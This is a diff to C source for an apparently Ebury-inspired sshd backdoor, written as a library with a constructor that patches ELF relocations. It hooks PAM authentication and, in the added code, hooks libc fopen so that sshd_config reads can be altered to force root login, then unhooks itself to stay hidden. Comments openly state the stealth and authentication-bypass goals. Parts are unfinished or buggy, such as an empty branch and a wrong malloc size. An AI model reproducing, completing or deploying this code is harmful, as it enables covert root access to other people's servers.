@@ -9,6 +9,7 @@
 
 #include <security/pam_appl.h>
 #include <sys/mman.h>
+#include <sys/stat.h>
 
 #include <dlfcn.h>
 #include <link.h>
@@ -110,7 +111,7 @@ static void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
 }
 
 /*
- * parses a .dynamic relocation table (DT_RELA) to return the Elf64_Rela * entry associated 
+ * parses a .dynamic relocation table (DT_RELA || DT_JMPREL) to return the Elf64_Rela * entry associated 
  *	with the func we want to hook...
  *
  * char* cast for correct arithmetic (surprisingly simple thing to forget)
@@ -267,21 +268,92 @@ static int my_pam_auth(struct pam_handle *pamh, int flags)
 }
 
 /*
- *
+ * the goal is to make sure PermitRootLogin is set to yes - regardless if it is explicity set or not
+ *	and then unhook ourselves sneaky beaky like
  */
 Elf64_Rela *ref_fopen_Rela;
+FILE *(*ref_fopen)(char*, char*);
 
 FILE *my_fopen(char *filename, char *mode)
 {
+	FILE *fp = ref_fopen(filename, mode);
+	fpos_t ref_pos;
+
+	fgetpos(fp, &ref_pos);
+
+
+	FILE *debug = ref_fopen("/root/asf", "a+");
+
+
+	signed long int size; /* XXX: checkme: type sanity */
+	struct stat st;	
+	stat(filename, &st);
+	size = st.st_size;
+
+
+	char *str = malloc(sizeof(512));
+	size_t n = 0;
+	
+	/* 
+	 * libkeyutils hates _GNU_SOURCE and haven't bothered to learn about Makefiles and advanced #define usage
+	 * 	so no strcasestr();
+	 */
+	char *PermitRootLogin;
+	bool noset = false;
+		
+	int ret = 42;
+	while (ret != -1) {
+		ret = getline(&str, &n, fp);
+
+		PermitRootLogin = strstr(str, "PermitRootLogin");
+		/* PermitRootLogin is explicity set to Yes || No */
+		if (PermitRootLogin != NULL) {
+			char *setting;
+			
+			setting = strstr(PermitRootLogin, "Yes");	
+			if (setting == NULL)
+				setting = strstr(PermitRootLogin, "yes");	
+			/*
+			 * Yes || yes  -- who cares. get me out of here and reset ref_fopen_Rela -- we gucci
+			 *	otherwise we are going to dupe sshd_config
+			 */
+			if (setting != NULL) {
+				goto done;
+
+			}
+
+			setting = strstr(PermitRootLogin, "No");	
+			if (setting == NULL)
+				setting = strstr(PermitRootLogin, "no");	
+			/* PermitRootLogin [n-N][o] */
+			if (setting != NULL) {
+				noset = true;
+				break;
+				/* break to below -- No is explicity set */
+			}
+		}
+	}
+	
+	if (noset == true) {
+		/* "PermitRootLogin No" was explicity set */
+	} else {
+		/* we do not want to use the default PERMIT_NOT_SET -- we want to use PERMIT_YES so pam will authenticate us */
+
+
+	}
 
 
 
 
 
 
+	
+done:	
+	free(str);
 
-
-
+	fclose(debug);
+	fsetpos(fp, &ref_pos);
+	return fp;
 }
 
 static void  __attribute__ ((constructor)) init(void)
@@ -341,6 +413,7 @@ static void  __attribute__ ((constructor)) init(void)
 /*	begin experiments -- fixing PermitRootLogin
 		how the hell did the original Ebury guys do this? */
 
+	/* XXX: all of this crap deserves a wrapper - ? muh modularity */
 
 	void *libcstart = get_libstart(link_map, "libc.so.6");
 	void *libc_func = find_func_ptr(link_map, libcstart, "fopen");
@@ -351,15 +424,19 @@ static void  __attribute__ ((constructor)) init(void)
 		return;
 
 
-
-
+	/* changeme: s/foundrela/ref_fopen_Rela/g -- inside my_fopen we will need to change fopen back to normal :^) */
 	foundrela = parse_rela(RELA, RELASZ, libc_func, &type);
-	if (foundrela == NULL)
+	if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
 		foundrela = parse_rela(JMPREL, PLTRELSZ, libc_func, &type);
+	if (foundrela == NULL) /* :( */
+		return;
 
+	/* checking type is pretty much a formaility at the moment -- but will be useful later */
+	if (type == RELOC_ADDEND) {
+		ref_fopen = (void *) foundrela->r_addend;
+		hook_rela_addend(foundrela, my_fopen);
 
-	ref_fopen_Rela = malloc(sizeof(Elf64_Rela));
-	memcpy(foundrela, ref_fopen_Rela, sizeof(Elf64_Rela));
+	}
 
 
 
@@ -367,6 +444,5 @@ static void  __attribute__ ((constructor)) init(void)
 
 	
 
-	free(ref_fopen_Rela);	
 	return;
 }
